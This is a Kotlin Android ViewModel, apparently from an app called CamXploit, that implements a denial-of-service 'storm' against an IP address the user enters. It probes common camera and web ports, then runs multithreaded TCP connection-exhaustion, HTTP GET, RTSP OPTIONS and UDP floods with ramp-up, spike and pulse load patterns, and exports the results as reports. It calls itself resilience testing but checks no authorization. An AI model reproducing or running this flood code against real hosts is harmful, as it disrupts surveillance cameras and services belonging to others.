package com.spyboy.camxploit

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Environment
import android.widget.Toast
import androidx.core.content.FileProvider
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import org.json.JSONObject
import java.io.File
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong

class StormViewModel(private val context: Context) : ViewModel() {

    private val _config = MutableStateFlow(StormConfig())
    val config = _config.asStateFlow()

    private val _metrics = MutableStateFlow(StormMetrics())
    val metrics = _metrics.asStateFlow()

    private val _logs = MutableStateFlow<List<StormLog>>(emptyList())
    val logs = _logs.asStateFlow()

    private val _validationState = MutableStateFlow<ValidationState>(ValidationState.Idle)
    val validationState = _validationState.asStateFlow()

    private val _report = MutableStateFlow<StormReport?>(null)
    val report = _report.asStateFlow()

    private var stormJob: Job? = null
    private var validationJob: Job? = null
    private var lastValidationTime = 0L

    fun setTargetIpIfEmpty(ip: String) {
        val trimmed = ip.trim()
        if (_config.value.targetIp.isBlank() && trimmed.isNotBlank()) {
            _config.update { it.copy(targetIp = trimmed) }
        }
    }

    fun updateConfig(newConfig: StormConfig) {
        if (_config.value.vector != newConfig.vector) {
            log("Attack Vector changed to: ${newConfig.vector.displayName}")
        }
        _config.value = newConfig.copy(targetIp = newConfig.targetIp.trim())
    }

    private fun log(message: String, level: LogLevel = LogLevel.INFO) {
        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        _logs.update { currentLogs ->
            (currentLogs + StormLog(timestamp, message, level)).takeLast(200)
        }
    }

    fun validateTarget() {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastValidationTime < 800) return
        lastValidationTime = currentTime

        val ip = _config.value.targetIp.trim()
        if (ip.isBlank()) {
            _validationState.value = ValidationState.Invalid("IP cannot be empty")
            return
        }

        validationJob?.cancel()
        validationJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                _validationState.value = ValidationState.Validating
                log("Probing target $ip for responsive ports...")

                val openPorts = mutableListOf<Int>()
                val portsToScan = (listOf(_config.value.targetPort) + listOf(80, 443, 554, 8000, 8080, 8554)).distinct()

                portsToScan.forEach { port ->
                    ensureActive()
                    try {
                        Socket().use { socket ->
                            socket.connect(InetSocketAddress(ip, port), 1000)
                            openPorts.add(port)
                        }
                    } catch (e: Exception) {}
                }

                ensureActive()
                if (openPorts.isNotEmpty()) {
                    _validationState.value = ValidationState.Valid(openPorts)
                    log("Target $ip responsive. Open ports: ${openPorts.joinToString()}", LogLevel.INFO)
                    _config.update { it.copy(targetPort = openPorts.first()) }
                } else {
                    _validationState.value = ValidationState.Invalid("No common ports responsive on $ip")
                    log("Target probe failed: Host unreachable or all ports closed on $ip", LogLevel.WARN)
                }
            } catch (e: Exception) {
                if (e !is CancellationException) {
                    _validationState.value = ValidationState.Invalid("Validation error: ${e.message}")
                    log("Validation error on $ip: ${e.message}", LogLevel.ERROR)
                }
            }
        }
    }

    fun startStorm() {
        if (_metrics.value.isRunning) return

        val ip = _config.value.targetIp.trim()
        val port = _config.value.targetPort
        val duration = _config.value.durationSeconds
        val threadsCount = _config.value.threads
        val vector = _config.value.vector
        val loadPattern = _config.value.loadPattern

        if (ip.isBlank()) {
            log("Error: No target specified", LogLevel.ERROR)
            return
        }

        _report.value = null
        _logs.value = emptyList()
        _metrics.value = StormMetrics(isRunning = true, totalDuration = duration)

        stormJob = viewModelScope.launch(Dispatchers.IO) {
            log("INITIATING STORM ON $ip:$port", LogLevel.CRITICAL)
            log("Vector: ${vector.displayName}", LogLevel.INFO)
            log("Load Pattern: ${loadPattern.name}", LogLevel.INFO)
            log("Threads: $threadsCount", LogLevel.INFO)

            val startTime = System.currentTimeMillis()
            val totalRequestsCounter = AtomicLong(0)
            val failedRequestsCounter = AtomicLong(0)
            val totalLatencySum = AtomicLong(0)
            val latencyCount = AtomicLong(0)
            val peakRpsTracker = AtomicInteger(0)

            val currentSecondRequests = AtomicLong(0)
            val currentSecondLatencySum = AtomicLong(0)
            val currentSecondLatencyCount = AtomicLong(0)
            val currentSecondErrors = AtomicLong(0)

            val workers = (0 until threadsCount).map { threadIndex ->
                launch(Dispatchers.IO) {
                    while (isActive && (System.currentTimeMillis() - startTime) < duration * 1000) {
                        val elapsed = ((System.currentTimeMillis() - startTime) / 1000).toInt()
                        val activeThread = when (loadPattern) {
                            LoadPattern.RAMP_UP -> {
                                val ratio = (elapsed.toFloat() / duration.toFloat()).coerceIn(0.1f, 1f)
                                (threadsCount * ratio).toInt().coerceAtLeast(1)
                            }
                            LoadPattern.SPIKE -> {
                                if (elapsed % 10 < 5) threadsCount else (threadsCount / 4).coerceAtLeast(1)
                            }
                            LoadPattern.PULSE -> {
                                if (elapsed % 4 < 2) threadsCount else 0
                            }
                            LoadPattern.SUSTAINED -> threadsCount
                        }

                        if (threadIndex >= activeThread) {
                            delay(100)
                            continue
                        }

                        val reqStart = System.currentTimeMillis()
                        var success = false
                        try {
                            when (vector) {
                                AttackVector.TCP_SYN_FLOOD, AttackVector.CONNECTION_EXHAUSTION -> {
                                    Socket().use { socket ->
                                        socket.connect(InetSocketAddress(ip, port), 600)
                                        success = true
                                    }
                                }
                                AttackVector.HTTP_GET_FLOOD -> {
                                    val url = URL("http://$ip:$port/")
                                    val connection = url.openConnection() as HttpURLConnection
                                    connection.connectTimeout = 600
                                    connection.readTimeout = 600
                                    connection.requestMethod = "GET"
                                    connection.setRequestProperty("User-Agent", "CamXploit-Storm/1.0")
                                    val responseCode = connection.responseCode
                                    success = responseCode in 100..599
                                    connection.disconnect()
                                }
                                AttackVector.RTSP_DESCRIBE_FLOOD -> {
                                    Socket().use { socket ->
                                        socket.connect(InetSocketAddress(ip, port), 600)
                                        socket.soTimeout = 600
                                        val output = socket.getOutputStream()
                                        output.write("OPTIONS rtsp://$ip:$port/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CamXploit\r\n\r\n".toByteArray())
                                        output.flush()
                                        success = true
                                    }
                                }
                                AttackVector.UDP_AMPLIFICATION -> {
                                    DatagramSocket().use { datagramSocket ->
                                        datagramSocket.soTimeout = 600
                                        val data = "CAMXPLOIT_STORM_PROBE".toByteArray()
                                        val packet = DatagramPacket(data, data.size, InetAddress.getByName(ip), port)
                                        datagramSocket.send(packet)
                                        success = true
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            success = false
                        }

                        val latency = System.currentTimeMillis() - reqStart
                        totalRequestsCounter.incrementAndGet()
                        totalLatencySum.addAndGet(latency)
                        latencyCount.incrementAndGet()

                        currentSecondRequests.incrementAndGet()
                        currentSecondLatencySum.addAndGet(latency)
                        currentSecondLatencyCount.incrementAndGet()
                        if (!success) {
                            currentSecondErrors.incrementAndGet()
                            failedRequestsCounter.incrementAndGet()
                        }

                        delay(2)
                    }
                }
            }

            val metricJob = launch {
                val startTimeMillis = System.currentTimeMillis()
                while (isActive && (System.currentTimeMillis() - startTimeMillis) < duration * 1000) {
                    delay(1000)
                    val elapsed = ((System.currentTimeMillis() - startTimeMillis) / 1000).toInt()

                    val reqs = currentSecondRequests.getAndSet(0)
                    val latSum = currentSecondLatencySum.getAndSet(0)
                    val latCount = currentSecondLatencyCount.getAndSet(0)
                    val errs = currentSecondErrors.getAndSet(0)

                    val rps = reqs.toInt()

                    var currentMax = peakRpsTracker.get()
                    while (rps > currentMax) {
                        if (peakRpsTracker.compareAndSet(currentMax, rps)) break
                        currentMax = peakRpsTracker.get()
                    }

                    val avgLat = if (latCount > 0) (latSum / latCount).toInt() else 0
                    val errRate = if (reqs > 0) (errs.toDouble() / reqs.toDouble()) * 100.0 else 0.0
                    val totalPkts = totalRequestsCounter.get()

                    val prevRps = _metrics.value.requestsPerSecond
                    _metrics.update { m ->
                        m.copy(
                            isRunning = true,
                            elapsedSeconds = elapsed,
                            requestsPerSecond = rps,
                            previousRps = prevRps,
                            avgLatencyMs = if (avgLat > 0) avgLat else m.avgLatencyMs,
                            errorRate = errRate,
                            totalPackets = totalPkts,
                            totalDuration = duration
                        )
                    }

                    if (elapsed > 0 && elapsed % 5 == 0) {
                        log("Flood traffic batch: $rps req/s, Latency: ${avgLat}ms, Errors: ${String.format(Locale.getDefault(), "%.1f", errRate)}%", LogLevel.INFO)
                    }
                }
            }

            workers.joinAll()
            metricJob.cancel()

            val actualDurationSeconds = maxOf(1, ((System.currentTimeMillis() - startTime) / 1000).toInt())
            val finalTotalReqs = totalRequestsCounter.get()
            val finalFailedReqs = failedRequestsCounter.get()
            val calculatedPeakRps = maxOf(peakRpsTracker.get(), (finalTotalReqs / actualDurationSeconds).toInt())
            val calculatedAvgLat = if (latencyCount.get() > 0) (totalLatencySum.get() / latencyCount.get()).toInt() else _metrics.value.avgLatencyMs

            withContext(Dispatchers.Main) {
                finishStorm(
                    actualDuration = actualDurationSeconds,
                    peakRps = calculatedPeakRps,
                    totalRequests = finalTotalReqs,
                    failedRequests = finalFailedReqs,
                    avgLatencyMs = calculatedAvgLat
                )
            }
        }
    }

    private fun finishStorm(
        actualDuration: Int,
        peakRps: Int,
        totalRequests: Long,
        failedRequests: Long,
        avgLatencyMs: Int
    ) {
        val finalMetrics = _metrics.value
        _metrics.value = finalMetrics.copy(isRunning = false, elapsedSeconds = actualDuration)

        val report = StormReport(
            targetIp = _config.value.targetIp,
            actualDuration = actualDuration,
            peakRps = peakRps,
            totalRequests = totalRequests,
            failedRequests = failedRequests,
            avgLatencyMs = avgLatencyMs
        )
        _report.value = report
        log("Storm complete. Real target resilience calculated.", LogLevel.INFO)
    }

    fun stopStorm() {
        stormJob?.cancel()
        log("Storm aborted by user", LogLevel.WARN)
        _metrics.value = _metrics.value.copy(isRunning = false)
    }

    fun saveReport(ctx: Context = context) {
        val currentReport = _report.value
        if (currentReport == null) {
            log("No storm report available to save", LogLevel.WARN)
            return
        }

        try {
            val json = JSONObject().apply {
                put("targetIp", currentReport.targetIp)
                put("vector", _config.value.vector.displayName)
                put("threads", _config.value.threads)
                put("loadPattern", _config.value.loadPattern.name)
                put("actualDuration", currentReport.actualDuration)
                put("peakRps", currentReport.peakRps)
                put("totalRequests", currentReport.totalRequests)
                put("failedRequests", currentReport.failedRequests)
                put("avgLatencyMs", currentReport.avgLatencyMs)
                put("timestamp", currentReport.timestamp)
            }

            val dir = ctx.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
            val file = File(dir, "Storm_Report_${currentReport.targetIp.replace(".", "_")}_${System.currentTimeMillis()}.json")
            file.writeText(json.toString(2))

            log("Report saved to Documents: ${file.name}", LogLevel.INFO)
            Toast.makeText(ctx, "Saved report: ${file.name}", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            log("Failed to save report: ${e.message}", LogLevel.ERROR)
        }
    }

    fun exportReport(ctx: Context = context) {
        val currentReport = _report.value
        if (currentReport == null) {
            log("No storm report available to export", LogLevel.WARN)
            return
        }

        try {
            val json = JSONObject().apply {
                put("targetIp", currentReport.targetIp)
                put("vector", _config.value.vector.displayName)
                put("threads", _config.value.threads)
                put("loadPattern", _config.value.loadPattern.name)
                put("actualDuration", currentReport.actualDuration)
                put("peakRps", currentReport.peakRps)
                put("totalRequests", currentReport.totalRequests)
                put("failedRequests", currentReport.failedRequests)
                put("avgLatencyMs", currentReport.avgLatencyMs)
                put("timestamp", currentReport.timestamp)
            }.toString(2)

            val dir = ctx.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
            val file = File(dir, "Storm_Report_${currentReport.targetIp.replace(".", "_")}_${System.currentTimeMillis()}.json")
            file.writeText(json)

            val uri = FileProvider.getUriForFile(ctx, "${ctx.packageName}.fileprovider", file)
            val shareIntent = Intent(Intent.ACTION_SEND).apply {
                type = "application/json"
                putExtra(Intent.EXTRA_STREAM, uri)
                putExtra(Intent.EXTRA_SUBJECT, "CamXploit Storm Breaker Report - ${currentReport.targetIp}")
                putExtra(Intent.EXTRA_TEXT, json)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            ctx.startActivity(Intent.createChooser(shareIntent, "Share Storm Report"))
            log("Report exported successfully", LogLevel.INFO)
        } catch (e: Exception) {
            val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText("Storm Report", _report.value.toString())
            clipboard.setPrimaryClip(clip)
            log("Report copied to clipboard", LogLevel.INFO)
            Toast.makeText(ctx, "Report copied to clipboard", Toast.LENGTH_SHORT).show()
        }
    }

    class Factory(private val context: Context) : ViewModelProvider.Factory {
        @Suppress("UNCHECKED_CAST")
        override fun <T : ViewModel> create(modelClass: Class<T>): T {
            return StormViewModel(context) as T
        }
    }
}
